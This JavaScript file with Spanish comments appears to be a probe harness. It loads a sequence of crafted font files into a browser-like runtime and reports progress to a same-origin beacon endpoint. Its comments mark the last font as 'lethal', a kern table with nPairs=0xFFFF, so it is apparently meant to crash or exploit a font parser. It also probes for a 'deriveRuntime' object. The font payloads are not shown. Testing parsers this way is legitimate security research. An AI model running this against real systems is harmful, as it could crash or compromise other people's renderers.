/* press-44 EXTERNO — si/cuando el runtime ejecute scripts externos, esto corre. */
(function(){
"use strict";
if(window.__p44)return; window.__p44=1;
var RID="v44x"+Date.now().toString(36).slice(-13);
function bk(s,b){try{fetch("/beacon/"+s,{method:"POST",cache:"no-store",keepalive:true,headers:{"Content-Type":"application/json"},body:JSON.stringify({r:RID,b:String(b).slice(0,500)})}).catch(function(){});}catch(e){}}
var HB=setInterval(function(){bk("V44-HB","hb");},2000);
var dr="-",rt="-";
try{dr=typeof window.deriveRuntime;rt=(dr==="object"&&window.deriveRuntime)?typeof window.deriveRuntime.run:"-";}catch(e){}
bk("V44-L","press44-EXT; dr="+dr+"; rt="+rt);
function Trnd(){return Date.now().toString(36)+Math.floor(Math.random()*1e4).toString(36);}
var done={};
function doLoad(id,f){
  if(done[id])return;done[id]=1;
  bk("V44-E"+id,"enter-load "+id+" ("+f+")");
  try{
    var ff=new FontFace("v44-"+id,"url(/document/al/ps5/"+f+"?t="+Trnd()+")");
    document.fonts.add(ff);
    ff.load().then(function(){bk("V44-R"+id,id+" load=OK status="+ff.status);},
                    function(err){bk("V44-R"+id,id+" rechaza:"+String((err&&err.name)+" "+((err&&err.message)||"")).slice(0,55));});
  }catch(e){bk("V44-R"+id,id+" E:"+String((e&&e.message)||e).slice(0,50));}
}
/* control primero; mentiras en medio; LETHAL-LAST = f19 kern (nPairs=0xFFFF) */
setTimeout(function(){doLoad("ctrl","f17.ttf");},300);
setTimeout(function(){doLoad("b","f17b.ttf");},1300);
setTimeout(function(){doLoad("d","f17d.ttf");},2300);
setTimeout(function(){doLoad("e","f17e.ttf");},3300);
setTimeout(function(){doLoad("post","f18.ttf");},4300);
setTimeout(function(){doLoad("c","f17c.ttf");},5300);
setTimeout(function(){bk("V44-Z","pre-lethal");},6800);
setTimeout(function(){doLoad("kern","f19.ttf");},7500);
setTimeout(function(){clearInterval(HB);bk("V44-Z2","late-z");},14000);
})();
